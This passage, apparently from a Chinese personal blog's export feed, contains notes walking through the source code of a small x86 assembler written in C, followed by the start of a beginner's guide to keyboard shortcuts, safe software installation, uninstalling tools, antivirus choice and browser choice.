label，标号提前处理。</p></li><li><p>接下来建立几个哈希表，分别把一系列汇编命令类别打进去，画风如下:（注意：这一部分只做一次，第二次循环开始KeyValue *map_insert(Map *map, const char *key, void *item)里的vector_push_back(map-&gt;data, kv);就不会再插入了）。</p></li><li><pre><code>Map *binop_table = new_map();map_insert(binop_table, &quot;mov&quot;, (void *)INST_MOV);map_insert(binop_table, &quot;movl&quot;, (void *)INST_MOVL);map_insert(binop_table, &quot;movsbl&quot;, (void *)INST_MOVSBL);map_insert(binop_table, &quot;movslq&quot;, (void *)INST_MOVSLQ);        ...Map *unary_table = new_map();map_insert(unary_table, &quot;push&quot;, (void *)INST_PUSH);map_insert(unary_table, &quot;pop&quot;, (void *)INST_POP);map_insert(unary_table, &quot;idiv&quot;, (void *)INST_IDIV);        ...<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6. 一旦查到了就进入处理的部分！</span><br><span class="line"></span><br><span class="line">接下来分析一下详细处理的部分。</span><br><span class="line"></span><br></pre></td></tr></table></figure>if (kv = map_lookup(binop_table, str)) &#123;         Code *lhs = read_asm_param();         sexpect_ch(&#39;,&#39;);         Code *rhs = read_asm_param();         vector_push_back(code, new_binop_code((int)kv_value(kv), lhs, rhs));         continue;     &#125;<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. 先后两个 [read_asm_param()](#read_asm_param())分别分析左右操作数。</span><br><span class="line"></span><br><span class="line">2. 接着用 vector_push_back(code, new_binop_code((int)kv_value(kv), lhs, rhs));将其整合到一起。即将信息填充给第一个参数 code。我们从void vector_push_back(Vector *vec, void *item)的源码就可以看到填充过程。</span><br><span class="line"></span><br><span class="line">3. ```</span><br><span class="line">   void vector_push_back(Vector *vec, void *item)</span><br><span class="line">   &#123;</span><br><span class="line">       if (vec-&gt;data == NULL || vec-&gt;size == vec-&gt;rsved_size) &#123;</span><br><span class="line">           vec-&gt;rsved_size *= 2;</span><br><span class="line">           void **ndata = (void **)safe_malloc(sizeof(void *) * vec-&gt;rsved_size);</span><br><span class="line">           memcpy(ndata, vec-&gt;data, vec-&gt;size * sizeof(void *));</span><br><span class="line">           vec-&gt;data = ndata;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       vec-&gt;data[vec-&gt;size++] = item;</span><br><span class="line">   &#125;</span><br><span class="line">   //这里的 vec参数就是传进来的code的地址.</span><br></pre></td></tr></table></figure></code></pre></li><li><p>continue;返回继续循环。</p></li></ol><blockquote><p>最后就是返回 Vector * code 。我们知道，每一个 code都是一个汇编语句的结构体。所以  Vector * code  就是整个结构体链，就类似于我们的TAC链条，至此可以得出结论:&#x3D;&#x3D;该函数的作用就是将源汇编代码转换成结构体链条&#x3D;&#x3D;</p></blockquote><p>over,返回上一层<a href="#read_asm_from_filepath(infile)">Vector *read_asm_from_filepath(char *filepath)</a>。</p><h2 id="read-asm-param"><a href="#read-asm-param" class="headerlink" title="read_asm_param();"></a>read_asm_param();</h2><blockquote><p>该函数总结来说就是分析一个汇编语句的其中一个操作数的内容。&#x3D;&#x3D;例如：mov %rax, %rdi&#x3D;&#x3D;的 %rax。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">switch (ch) &#123;</span><br><span class="line">        case &#x27;%&#x27;:</span><br><span class="line">            return str2reg(read_asm_token());</span><br><span class="line"></span><br><span class="line">        case &#x27;$&#x27;: &#123;</span><br><span class="line">            getch();  // already skipped space</span><br><span class="line">            return new_value_code(read_asm_ival());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        case &#x27;(&#x27;:</span><br><span class="line">            return new_addrof_code(read_asm_memory(), 0);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>拿第一句来分析 ‘%’代表后面有寄存器。</p><p>​read_asm_token()函数：返回一个寄存器，例如 %rax，返回给str2reg(char *src);</p><p>​str2reg(char *src);里又是一系列哈希表打入操作，将寄存器们打入到Map,以下画风:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Map *map = new_map();</span><br><span class="line">map_insert(map, &quot;%al&quot;, nbyte_reg(1, 0));</span><br><span class="line">map_insert(map, &quot;%dil&quot;, nbyte_reg(1, 1));</span><br><span class="line">    map_insert(map, &quot;%sil&quot;, nbyte_reg(1, 2));</span><br><span class="line">    map_insert(map, &quot;%dl&quot;, nbyte_reg(1, 3));</span><br><span class="line">    map_insert(map, &quot;%cl&quot;, nbyte_reg(1, 4));</span><br><span class="line">    //其中nbyte_reg(1, 4))是Code类型的.</span><br></pre></td></tr></table></figure><p>​看看这个函数的返回值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return new_addrof_label_code(read_asm_memory(), label);</span><br></pre></td></tr></table></figure><p>而这个new_addrof_label_code函数返回的是Code*类型，因此就不难分析该函数最终完成了什么事情了。</p><blockquote><p>总结，该函数将指令的一个操作数存进了一个Code对象中并返回其地址。对了，Code对象定义如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct Code Code;</span><br><span class="line">struct Code &#123;</span><br><span class="line">    int kind;</span><br><span class="line"></span><br><span class="line">    Code *lhs, *rhs;</span><br><span class="line">    int ival;</span><br><span class="line">    char *sval;  // size is ival</span><br><span class="line">    char *label;</span><br><span class="line">    Vector *read_dep;</span><br><span class="line">    int can_be_eliminated;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></blockquote><p>​</p><h2 id="read-asm-token"><a href="#read-asm-token" class="headerlink" title="read_asm_token();"></a>read_asm_token();</h2><p>首先建立一个 StringBuilder *sb &#x3D; new_string_builder();结构体</p><p>然后调用 string_builder_append(sb, sgetch());这个函数是分析每一个字符的。</p><p>后面有个循环就是分析每一个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">while (1) &#123;</span><br><span class="line">        int ch = peekch();</span><br><span class="line">        if (!isalnum(ch) &amp;&amp; ch != &#x27;_&#x27; &amp;&amp; ch != &#x27;.&#x27; &amp;&amp; ch != &#x27;:&#x27;) break;</span><br><span class="line">        string_builder_append(sb, getch());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>&#x3D;&#x3D;最后返回一个词语，比如 .global&#x3D;&#x3D;</p></blockquote><h2 id="assemble-code-code"><a href="#assemble-code-code" class="headerlink" title="assemble_code(code);"></a>assemble_code(code);</h2><h2 id="SymbolInfo-get-symbol-info-char-label"><a href="#SymbolInfo-get-symbol-info-char-label" class="headerlink" title="SymbolInfo *get_symbol_info(char *label)"></a>SymbolInfo *get_symbol_info(char *label)</h2><p>传进来的其实是标号 ，返回类型 SymbolInfo * 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    int index;</span><br><span class="line">    char *label;</span><br><span class="line">    int st_name;</span><br><span class="line">    int st_info;</span><br><span class="line">&#125; SymbolInfo;</span><br></pre></td></tr></table></figure><p>接下来定义了一个 SymbolInfo *symbol 并进行了赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SymbolInfo *symbol = (SymbolInfo *)safe_malloc(sizeof(SymbolInfo));</span><br><span class="line">    symbol-&gt;index = vector_size(target_objimg-&gt;symtab) + 4;</span><br><span class="line">    symbol-&gt;label = label;</span><br><span class="line">    symbol-&gt;st_name = vector_size(target_objimg-&gt;strtab);</span><br><span class="line">    symbol-&gt;st_info = 0;</span><br></pre></td></tr></table></figure><p>最后的三个函数，暂时没法分析，哈哈。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add_string(target_objimg-&gt;strtab, label, strlen(label) + 1);</span><br><span class="line">map_insert(target_objimg-&gt;symbol_map, label, symbol);</span><br><span class="line">vector_push_back(target_objimg-&gt;symtab, symbol);</span><br></pre></td></tr></table></figure><blockquote><p>行，返回上面那个SymbolInfo *symbol ，完事。</p></blockquote><h2 id="ObjectImage-assemble-code-detail-Vector-code-list"><a href="#ObjectImage-assemble-code-detail-Vector-code-list" class="headerlink" title="ObjectImage *assemble_code_detail(Vector *code_list);"></a>ObjectImage *assemble_code_detail(Vector *code_list);</h2><blockquote><p>这里接收一个 Vector* 的参数，参数的size就是汇编代码的条数，实际上也是该链表的节点数。</p></blockquote><p>该函数有一个很重要的局部变量就是ObjectImage *objimg</p><blockquote><p>第一句就有ObjectImage *objimg &#x3D; (ObjectImage *)safe_malloc(sizeof(ObjectImage));</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct ObjectImage &#123;</span><br><span class="line">    Vector *text;    // vector&lt;int&gt;</span><br><span class="line">    Vector *data;    // vector&lt;int&gt;</span><br><span class="line">    Vector *rela;    // vector&lt;RelaEntry *&gt;</span><br><span class="line">    Vector *strtab;  // vecotr&lt;int&gt;</span><br><span class="line">    Vector *symtab;  // vector&lt;SymbolInfo *&gt;</span><br><span class="line"></span><br><span class="line">    Map *symbol_map;    // map&lt;char *, SymbolInfo *&gt;</span><br><span class="line">    Map *label2offset;  // map&lt;char *, SectionOffset&gt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></blockquote><p>接下来便是给objimg的每一个成员malloc内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">objimg-&gt;text = new_vector();</span><br><span class="line">objimg-&gt;data = new_vector();</span><br><span class="line">objimg-&gt;rela = new_vector();</span><br><span class="line">objimg-&gt;strtab = new_vector();</span><br><span class="line">vector_push_back(objimg-&gt;strtab, 0x00);</span><br><span class="line">objimg-&gt;symtab = new_vector();</span><br><span class="line">objimg-&gt;symbol_map = new_map();</span><br><span class="line">objimg-&gt;label2offset = new_map();</span><br></pre></td></tr></table></figure><p>接下来的init_target_objimg(objimg);很简单，就是造一个全局对象 ObjectImage * target_objimg，然后把上面的赋过去。set_current_section(TEXT_SECTION);同样设置一个全局current_section并得到赋值。</p><blockquote><p>在这里请务必注意有全局和局部两个 objimg。</p></blockquote><blockquote><p>&#x3D;&#x3D;接下来的这个for循环就是分析每一个节点了&#x3D;&#x3D;</p></blockquote><ol><li><p>首先<code>Code *code = vector_get(code_list, i);</code>便是获取该节点。</p></li><li><p>举个例子，第二句汇编<code>syscall:</code></p><p><img src="C:\Users\QIANGQ\AppData\Roaming\Typora\typora-user-images\image-20221116012713779.png" alt="image-20221116012713779"></p></li><li><p>接下来 switch (code-&gt;kind)。</p><p>比如第一句是 .global 跳转到836行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case CD_GLOBAL:</span><br><span class="line">                get_symbol_info(code-&gt;label)-&gt;st_info |= 0x10;</span><br><span class="line">                break;</span><br></pre></td></tr></table></figure><p>浅浅分析一下下面的函数 [get_symbol_info(code-&gt;label)](#SymbolInfo *get_symbol_info(char *label))。</p><p>上面那个真难分析，咱们来分析一个mov语句看看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">case INST_MOV:</span><br><span class="line">if (is_reg64(code-&gt;lhs) &amp;&amp; is_reg64(code-&gt;rhs)) &#123;</span><br><span class="line">                    emit_byte(rex_prefix_reg_ext(1, code-&gt;lhs, code-&gt;rhs));</span><br><span class="line">                    emit_byte(0x89);</span><br><span class="line">                    emit_byte(</span><br><span class="line">                        modrm(3, reg_field(code-&gt;lhs), reg_field(code-&gt;rhs)));</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><p>首先case里面的很多if语句，其实是分析mov语句的操作数类型的，如下面:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (is_reg64(code-&gt;lhs) &amp;&amp; is_reg64(code-&gt;rhs))&#123;&#125;</span><br><span class="line">if (is_reg32(code-&gt;lhs) &amp;&amp; is_reg32(code-&gt;rhs))&#123;&#125;</span><br><span class="line">if (is_imm(code-&gt;lhs) &amp;&amp; is_reg32(code-&gt;rhs))&#123;&#125;</span><br><span class="line">if (is_addrof(code-&gt;lhs) &amp;&amp; is_reg64(code-&gt;rhs))&#123;&#125;</span><br><span class="line">if (is_reg8(code-&gt;lhs) &amp;&amp; is_addrof(code-&gt;rhs))&#123;&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>例如第一句 mov %rdi, %rax 显然应该进入第一个if语句。</p><p>if里面实际上是三个emit_byte函数，这里面实际上是另一个函数add_byte。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">emit_byte(rex_prefix_reg_ext(1, code-&gt;lhs, code-&gt;rhs));</span><br><span class="line">emit_byte(0x89);</span><br><span class="line">emit_byte(modrm(3, reg_field(code-&gt;lhs), reg_field(code-&gt;rhs)));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void emit_byte(int val0) &#123; add_byte(buffer_to_emit, val0); &#125;</span><br></pre></td></tr></table></figure><p>这里的buffer_to_emit是一个全局的结构体，有定义过：Vector *buffer_to_emit &#x3D; NULL;</p><p>讲道理，这里没那么好分析，因为主要都是涉及到数字的位运算。</p><blockquote><p>从这里大致推断，&#x3D;&#x3D;实际上是在填充全局的 Vector *buffer_to_emit。&#x3D;&#x3D;</p></blockquote></li></ol><p>接下来的一个 for 循环时涉及到 symtab 节的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; vector_size(target_objimg-&gt;symtab); i++) &#123;</span><br><span class="line">        SymbolInfo *sym = (SymbolInfo *)vector_get(target_objimg-&gt;symtab, i);</span><br><span class="line">        if (map_lookup(target_objimg-&gt;label2offset, sym-&gt;label) == NULL)</span><br><span class="line">            sym-&gt;st_info |= 0x10;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再接下来分析那个 objimg-&gt;rela。</p><p>最后 set_current_section(TEXT_SECTION);以及分析label_placeholders。注释很关键：&#x2F;&#x2F; write offset to label placeholders。</p><blockquote><p>最后，返回 ObjectImage *objimg。主函数使用ObjectImage *obj &#x3D; assemble_code(code);进行接收。其实可以从调试看出很多信息。ok,返回！</p></blockquote><h2 id="dump-object-image-obj-fh"><a href="#dump-object-image-obj-fh" class="headerlink" title="dump_object_image(obj, fh);"></a>dump_object_image(obj, fh);</h2><blockquote><p>该函数接收两个参数，其一为前面的 ObjectImage *obj ，它存储了所有的段表及符号信息，其二便是目标文件指针。</p></blockquote><p>第一个函数 init_target_objimg(objimg);同样为了初始化 ObjectImage *target_objimg &#x3D; objimg;的全局对象。</p><p>第二个函数 set_buffer_to_emit(dumped);同样为了初始化 Vector *buffer_to_emit &#x3D; buffer; 的全局对象。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><p>该项目均采用vector数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Vector</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> size, rsved_size;</span><br><span class="line">    <span class="type">void</span> **data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="KeyValue"><a href="#KeyValue" class="headerlink" title="KeyValue"></a>KeyValue</h3><p>key存字符串</p><p>value存对应的值，用于匹配查询</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">KeyValue</span> &#123;</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *key;</span><br><span class="line">    <span class="type">void</span> *value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Map</span> &#123;</span></span><br><span class="line">    Vector *data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">StringBuilder</span> &#123;</span></span><br><span class="line">    Vector *data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p>src用于存储输入的汇编文件</p><p>line和cloumn表示正在处理的行列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> line, column;</span><br><span class="line">    Vector *line2length;</span><br><span class="line">    <span class="type">char</span> *src;</span><br><span class="line">    <span class="comment">// example: &quot;/tmp/1.c&quot; -&gt; cwd: &quot;/tmp/&quot;</span></span><br><span class="line">    <span class="type">char</span> *cwd;  <span class="comment">// current working directory with &#x27;/&#x27;</span></span><br><span class="line">    <span class="type">char</span> *filepath;</span><br><span class="line">&#125; Source;</span><br></pre></td></tr></table></figure><h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><p>用于存储汇编指令</p><p>lhs表示左操作数，rhs表示右操作数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Code</span> <span class="title">Code</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Code</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> kind;</span><br><span class="line"></span><br><span class="line">    Code *lhs, *rhs;</span><br><span class="line">    <span class="type">int</span> ival;</span><br><span class="line">    <span class="type">char</span> *sval;  <span class="comment">// size is ival</span></span><br><span class="line">    <span class="type">char</span> *label;</span><br><span class="line">    Vector *read_dep;</span><br><span class="line">    <span class="type">int</span> can_be_eliminated;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ObjectImage"><a href="#ObjectImage" class="headerlink" title="ObjectImage"></a>ObjectImage</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectImage</span> &#123;</span></span><br><span class="line">    Vector *text;    <span class="comment">// vector&lt;int&gt;</span></span><br><span class="line">    Vector *data;    <span class="comment">// vector&lt;int&gt;</span></span><br><span class="line">    Vector *rela;    <span class="comment">// vector&lt;RelaEntry *&gt;</span></span><br><span class="line">    Vector *strtab;  <span class="comment">// vecotr&lt;int&gt;</span></span><br><span class="line">    Vector *symtab;  <span class="comment">// vector&lt;SymbolInfo *&gt;</span></span><br><span class="line"></span><br><span class="line">    Map *symbol_map;    <span class="comment">// map&lt;char *, SymbolInfo *&gt;</span></span><br><span class="line">    Map *label2offset;  <span class="comment">// map&lt;char *, SectionOffset&gt;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> General Records </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>萌新电脑操作技巧</title>
      <link href="/2021/07/31/G01_hello-world/"/>
      <url>/2021/07/31/G01_hello-world/</url>
      
        <content type="html"><![CDATA[<blockquote><p>​写给大一的同学 —– 对于我们专业的同学们来说电脑是经常接触到的，就正如我们的桌面一样，保持电脑的干净整洁，不仅能让心情愉快，还能提高工作效率。<br><br/>几年前家里那台老台式机，充斥着各种弹窗广告，c盘被挤满，好几个杀毒软件养蛊，浏览器被篡改，这些都使得这台电脑速度慢，频繁卡顿，安全性低，不整洁。或许你也并不希望在敲码,玩游戏或追剧正尽兴时忽然冒出一个砍一刀999级的广告，因此根据我的一些经历在这里写了一些关于保养电脑的想法。持续更新一段时间。<br><br/>当然知识受限，如果有错误或不完备的还请你多多指教，谢谢啦。</p></blockquote><center>Latest Version：2021/8/6 - 11：30</center><hr><h2 id="快捷按键"><a href="#快捷按键" class="headerlink" title=" 快捷按键"></a><img src="https://i.loli.net/2021/08/02/xaeHiozfsJXCjbS.png" alt="key.png"> 快捷按键</h2><blockquote><p>经常使用电脑的同学有必要知道某些使用频率高的快捷键，这有帮助于提高操作效率。</p></blockquote><h3 id="文档编辑类"><a href="#文档编辑类" class="headerlink" title="文档编辑类"></a>文档编辑类</h3><ul><li>CTRL + C&#x2F;V 复制(Copy)&#x2F;粘贴(Paste)</li><li>CTRL + A 全选(All)</li><li>CTRL + Z 撤销(Unmake)</li><li>CTRL + X 剪贴</li><li>CTRL + S 保存(Save)</li><li>CTRL + Y 反撤销</li><li>win +  V 打开剪贴板</li><li>CTRL + 鼠标滚轮 网页等放大缩小</li><li>CTRL + ALT + A （QQ登录时）截屏</li><li>CTRL + N　新建（New）</li></ul><h3 id="电脑操作类"><a href="#电脑操作类" class="headerlink" title="电脑操作类"></a>电脑操作类</h3><ul><li>CTRL + SHIFT + ESC　打开任务管理器<br/><br>   ps.尤其是电脑出现软件卡死时打开任务管理器，右键单击该软件可以强制退出；当电脑莫名卡顿时也可以通过查看CPU占用比异常高的后台程序通过上网搜索寻求解放方案。（但后台和进程程序最好不要擅自强制关闭）</li><li>触摸板三指左右滑  切换任务界面</li><li>触摸板三指上下滑  返回页面&#x2F;返回桌面</li></ul><h2 id="使用技巧"><a href="#使用技巧" class="headerlink" title=" 使用技巧"></a><img src="https://i.loli.net/2021/08/02/voMhIB371X9Zlmy.png" alt="aa.png"> 使用技巧</h2><h3 id="关于电脑使用"><a href="#关于电脑使用" class="headerlink" title="关于电脑使用"></a>关于电脑使用</h3><ol><li>电脑在哪里买：首选京东，天猫苏宁等官方旗舰店，一定不要去电脑城，线下的品牌专卖店比电脑城好些，但也不太推荐。</li><li>买的新电脑第一次开机不要急着联网，点击跳过，先检查好没问题再联网激活，否则会激活Windows就不能退了.</li><li>笔记本电脑需要散热，一般底部有进风口，侧边有出风口，所以要注意不要把风口堵住了。比如不要把笔记本直接放在被子上操作，待会燃起来了qwq.</li><li>硬盘分区。如果有512G或1T的固态硬盘最好分以下区哦，分成D:和E:两个盘，便于文件管理，例如D:放软件，E：放资料。分区方法可以搜一下。</li></ol><h3 id="关于软件安装"><a href="#关于软件安装" class="headerlink" title="关于软件安装"></a>关于软件安装</h3><ol><li>下载地点：最好选择官网，(一定看清楚哦，很多时候百度出来的位置靠前一两个的并不是官网)或者正规软件商店，不要选择百度里的非官方渠道，避免不兼容或捆绑病毒。</li><li>下载方式：先选择&lt;另存为&gt;到桌面，下载完安装包后桌面点击运行，等软件安装完毕后直接将桌面上的安装包拖进回收站。</li><li>点开安装包后，不要一直点击下一步，选择&lt;自定义安装&gt;而不是&lt;快速安装&gt;！因为如果有捆绑软件此时需要叉掉，并且不要安装到默认c盘，此时建议在D盘新建一个文件夹，然后将该软件安装到这个新建的文件夹里。</li></ol><p><img src="https://i.loli.net/2021/08/01/OtxwUqCyvgfPWJT.png" alt="QQ图片20210801153229.png"></p><h3 id="关于软件卸载"><a href="#关于软件卸载" class="headerlink" title="关于软件卸载"></a>关于软件卸载</h3><ul><li>卸载我推荐一个软件叫做 Geek Uninstaller <a href="https://geekuninstaller.com/">官网链接</a>,因为大多卸载方式存在文件残留以及注册表信息存留，此款软件无广告，轻量而且操作方便，推荐安装。</li></ul><h3 id="关于杀毒软件"><a href="#关于杀毒软件" class="headerlink" title="关于杀毒软件"></a>关于杀毒软件</h3><ul><li>事实上windows电脑自带Windows defender能够有防护效果，所以通常来讲电脑并不需要额外安装杀毒软件。不建议安装360，腾讯电脑管家等等，这些软件可能会占后台，篡改浏览器主页等等。如果实在想安装杀毒软件，火绒安全还不错。</li></ul><h3 id="关于文件分类"><a href="#关于文件分类" class="headerlink" title="关于文件分类"></a>关于文件分类</h3><ul><li>电脑上一切软件，包括操作系统都是由那几个盘里的文件构成的，因此学会整理文件不仅自己感到整齐，也可以方便我们查找，不增加混乱度。比如前面的下载软件单独到一个文件夹，还比如安装包下载到桌面用了就删掉，而不是让电脑默认下到C盘的某个不知名的角落占用内存等等。</li></ul><h3 id="关于浏览器"><a href="#关于浏览器" class="headerlink" title="关于浏览器"></a>关于浏览器</h3><ul><li>谷歌，火狐等浏览器都是不错的选择，但如果你不想下载，事实上win10自带的edge浏览器就是特别棒的选择！请一定不要单独下载什么360浏览器，2345浏览器等等。如果自己的主页被篡改了可以再网上搜索一下如何恢复edge默认主页。</li><li>edge浏览器占用少，速度快，并且干净整洁，并且有不少不错的插件功能。<br><img src="https://i.loli.net/2021/08/01/v93wWD7oykRKalx.png" alt="77.png"><br><img src="https://i.loli.net/2021/08/01/Lkbi1KO2qRHx3Np.png" alt="88.png"></li></ul><blockquote><p>Tips:如果你的电脑已经充满了这些杀毒软件，不好的浏览器，就从上面那一款卸载软件Geek Uninstaller的安装开始吧，然后卸载掉这些东西~</p></blockquote><h3 id="关于内存占用"><a href="#关于内存占用" class="headerlink" title="关于内存占用"></a>关于内存占用</h3><ul><li>净化开机启动项<br/><br>个别软件安装后默认加到开机启动里边，不仅拖慢开机速度，而且开机后默认启动到后台占用内存。<br/>打开任务管理器（CTRL+SHIFT+ESC）点击&lt;启动&gt;选项，禁用某些无关应用自启动，例如百度网盘等等。</li></ul><h2 id="软件推荐"><a href="#软件推荐" class="headerlink" title=" 软件推荐"></a><img src="https://i.loli.net/2021/08/02/KOYFXDysM8HetU9.png" alt="525.png"> 软件推荐</h2><blockquote><p>在这里推荐一些很好用的基础软件，如果你也有的话欢迎反馈。</p></blockquote><h3 id="浏览器"><a href="#浏览器" class="headerlink" 